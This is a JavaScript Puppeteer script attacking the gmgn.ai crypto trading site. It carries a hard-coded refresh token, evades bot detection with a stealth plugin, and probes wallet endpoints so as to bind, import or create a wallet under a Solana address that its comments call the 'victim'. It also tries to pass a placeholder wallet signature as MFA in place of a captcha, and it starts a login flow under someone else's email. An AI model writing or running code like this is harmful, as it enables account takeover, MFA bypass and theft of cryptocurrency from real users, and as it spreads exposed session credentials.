const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

// Original account
const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ5NDg4LCJpYXQiOjE3ODQxNTc0ODgsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTgxMWFhNjUtODg1Mi00MTVjLWFmNTAtNTk2ZjcxMmM1MmJhIiwibmJmIjoxNzg0MTU3NDg4LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.KNxifpPUukpBroGap6hYIWrPKPwLiiv8xRCZx5zpRCI7FJdXSdhVSnjxSnuqkETXZyCvKMV2qxPBSpovwWaDCQ';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';

(async () => {
    console.log('🔥 LAST HOPE — FINDING ALTERNATIVE PATHS');
    
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 3000));
    
    const result = await page.evaluate(async (refresh, params, target) => {
        const log = [];
        
        // Get token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'token fail', code: data.code, msg: data.message};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('Token OK (original account)');
        
        // APPROACH 1: TG Login to get FRESH session (zero captcha proven)
        log.push('=== TG LOGIN FLOW ===');
        
        const tgP = 'device_id=test1234&client_id=gmgn_tg_bot&from_app=tg';
        r = await fetch('/account/login_v3?' + tgP, {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({account: 'testfox@proton.me', account_type: 'email'})
        });
        data = await r.json();
        log.push('TG login step1: ' + data.code + ' ' + (data.message||''));
        if (data.code === 0) {
            log.push('Session: ' + JSON.stringify(data.data));
            const sessionId = data.data?.session_id;
            
            if (sessionId) {
                // We got a session! Now can we use this to bypass captcha?
                log.push('Got TG session: ' + sessionId);
            }
        }
        
        // APPROACH 2: Check ALL /tapi/v1/wallet/ endpoints
        log.push('=== TAPI WALLET ENDPOINTS ===');
        
        const tapiTests = [
            {url: '/tapi/v1/wallet/create', body: {chain: 'sol'}},
            {url: '/tapi/v1/wallet/create', body: {chain: 'sol', address: target, wallet_type: 'imported'}},
            {url: '/tapi/v1/wallet/restore', body: {chain: 'sol', address: target}},
            {url: '/tapi/v1/wallet/create', body: {chain: 'sol', import_address: target}},
        ];
        
        for (const t of tapiTests) {
            r = await fetch(t.url + '?' + params, {method: 'POST', headers: h, body: JSON.stringify(t.body)});
            if (r.status === 404) continue;
            data = await r.json();
            log.push(t.url.split('/').pop() + ' ' + JSON.stringify(t.body).substring(0,40) + ': ' + data.code + ' ' + (data.message||data.reason||'').substring(0,50));
            if (data.code === 0) {
                log.push('💀💀💀 SUCCESS: ' + JSON.stringify(data));
                return {log, success: true, data};
            }
        }
        
        // APPROACH 3: Can we use verify_wallet_signature as ALTERNATIVE MFA?
        // Instead of captcha, sign with our MPC wallet
        log.push('=== WALLET SIGNATURE AS MFA ===');
        
        // Get bind txn (won't work on original since already bound, but let's check unbind)
        r = await fetch('/account/account/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'unbind_wallet'})
        });
        data = await r.json();
        if (data.code === 0) {
            const txnId = data.data.data.txn_id;
            log.push('Unbind txn: ' + txnId);
            
            // Try wallet signature verification INSTEAD of captcha
            r = await fetch('/account/mfa/txn/v1/verify_wallet_signature?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({
                    txn_id: txnId,
                    usage: 'unbind_wallet',
                    wallet_address: 'FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8',
                    chain: 'sol',
                    message: 'Verify wallet ownership for unbind',
                    signature: 'placeholder'
                })
            });
            data = await r.json();
            log.push('verify_wallet_sig: ' + data.code + ' ' + (data.message||'').substring(0,80));
            
            // If it doesn't say "invalid" but says something about signature format,
            // that means this endpoint EXISTS as an alternative MFA method!
            if (data.code === 0) {
                log.push('💀 WALLET SIGNATURE ACCEPTED AS MFA!');
            }
        }
        
        // APPROACH 4: Check if there's a /wallet-api/v1/bind or connect endpoint
        log.push('=== WALLET-API BIND ENDPOINTS ===');
        
        const walletApiTests = [
            '/wallet-api/v1/bind_wallet',
            '/wallet-api/v1/connect_wallet',
            '/wallet-api/v1/link_wallet',
            '/wallet-api/v1/add_wallet',
            '/wallet-api/v1/import_wallet',
            '/wallet-api/v1/wallet/bind',
            '/wallet-api/v1/wallet/connect',
            '/wallet-api/v1/wallet/add',
        ];
        
        for (const url of walletApiTests) {
            r = await fetch(url + '?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({address: target, chain: 'sol', wallet_type: 'sol'})
            });
            if (r.status === 404) continue;
            data = await r.json();
            log.push(url.split('/').slice(-2).join('/') + ': ' + data.code + ' ' + (data.message||'').substring(0,50));
            if (data.code === 0) {
                log.push('💀💀💀 FOUND ALTERNATIVE BIND!');
                return {log, success: true, endpoint: url, data};
            }
        }
        
        // APPROACH 5: Can we create a wallet with the victim's address?
        // /tapi/v1/wallet/create might allow specifying an address
        log.push('=== CREATE WALLET WITH VICTIM ADDRESS ===');
        
        const createPayloads = [
            {chain: 'sol', address: target},
            {chain: 'sol', wallet_address: target},
            {chain: 'sol', import_key: target},
            {chain: 'sol', private_key: 'fake', address: target},
            {chain: 'sol', type: 'external', address: target},
            {chain: 'sol', type: 'imported', address: target},
            {chain: 'sol', wallet_type: 'external', address: target},
        ];
        
        for (const payload of createPayloads) {
            r = await fetch('/tapi/v1/wallet/create?' + params, {
                method: 'POST', headers: h, body: JSON.stringify(payload)
            });
            data = await r.json();
            if (data.code === 0) {
                log.push('💀 CREATE WORKED: ' + JSON.stringify(payload));
                log.push('Response: ' + JSON.stringify(data));
                return {log, success: true, data};
            }
            if (data.message && !data.message.includes('invalid argument')) {
                log.push('create(' + JSON.stringify(payload).substring(0,40) + '): ' + data.code + ' ' + (data.message||'').substring(0,40));
            }
        }
        
        return {log};
    }, ORIG_REFRESH, PARAMS, TARGET);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
